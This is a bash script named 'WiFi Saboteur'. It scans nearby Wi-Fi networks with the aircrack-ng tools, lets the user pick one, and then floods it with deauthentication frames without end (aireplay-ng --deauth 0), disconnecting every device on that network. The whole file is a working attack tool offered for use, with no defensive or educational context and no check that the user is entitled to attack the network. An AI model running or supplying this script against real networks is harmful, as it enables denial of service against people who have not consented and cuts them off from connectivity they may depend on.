#!/bin/bash

# Tool Name
TOOL_NAME="WiFi Saboteur"
VERSION="1.0"
DEVELOPER="Tyga Sparta"

# Colors for formatting
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to display the header
header() {
    clear
    echo -e "${GREEN}"
    echo "=============================================="
    echo "          $TOOL_NAME - Version $VERSION"
    echo "          Developed by: $DEVELOPER"
    echo "=============================================="
    echo -e "${NC}"
}

# Function to scan for available Wi-Fi networks
scan_networks() {
    echo -e "${YELLOW}[*] Scanning for available Wi-Fi networks...${NC}"
    sudo airmon-ng start wlan0 > /dev/null 2>&1
    sudo timeout 10 airodump-ng wlan0mon --output-format csv -w /tmp/scan > /dev/null 2>&1
    sudo airmon-ng stop wlan0mon > /dev/null 2>&1

    # Check if the scan file exists
    if [[ -f /tmp/scan-01.csv ]]; then
        # Display the list of networks
        cat /tmp/scan-01.csv | grep -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | awk -F',' '{print $14 " - " $4}' | nl -s ") "
    else
        echo -e "${RED}[!] Failed to scan networks. Please check your Wi-Fi adapter.${NC}"
        exit 1
    fi
}

# Function to select a network
select_network() {
    echo -e "${BLUE}"
    read -p "Enter the number of the network you want to target: " NETWORK_NUM
    BSSID=$(cat /tmp/scan-01.csv | grep -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | sed -n "${NETWORK_NUM}p" | awk -F',' '{print $1}')
    SSID=$(cat /tmp/scan-01.csv | grep -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | sed -n "${NETWORK_NUM}p" | awk -F',' '{print $14}')
    CHANNEL=$(cat /tmp/scan-01.csv | grep -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | sed -n "${NETWORK_NUM}p" | awk -F',' '{print $4}')
    if [[ -z "$BSSID" || -z "$SSID" || -z "$CHANNEL" ]]; then
        echo -e "${RED}[!] Invalid selection. Please try again.${NC}"
        select_network
    else
        echo -e "${GREEN}[+] Selected network: $SSID (BSSID: $BSSID, Channel: $CHANNEL)${NC}"
    fi
}

# Function to deactivate all devices
deactivate_all() {
    echo -e "${RED}[!] Deactivating all devices on $SSID...${NC}"
    sudo airmon-ng start wlan0 > /dev/null 2>&1
    sudo iwconfig wlan0mon channel $CHANNEL
    sudo aireplay-ng --deauth 0 -a "$BSSID" wlan0mon
    sudo airmon-ng stop wlan0mon > /dev/null 2>&1
}

# Function to clean up and exit
cleanup() {
    echo -e "${GREEN}[+] Cleaning up and exiting...${NC}"
    sudo airmon-ng stop wlan0mon > /dev/null 2>&1
    sudo systemctl restart NetworkManager
    rm -f /tmp/scan-01.csv
    exit 0
}

# Main function
main() {
    header

    # Scan for networks
    scan_networks

    # Select a network
    select_network

    # Ask for deactivation mode
    echo -e "${BLUE}1. Deactivate all devices${NC}"
    echo -e "${BLUE}2. Exit${NC}"
    read -p "Choose an option: " OPTION

    case $OPTION in
        1) deactivate_all ;;
        2) cleanup ;;
        *) echo -e "${RED}[!] Invalid option!${NC}" ;;
    esac

    # Clean up and exit
    cleanup
}

# Trap Ctrl+C to ensure cleanup
trap cleanup EXIT

# Start the tool
main
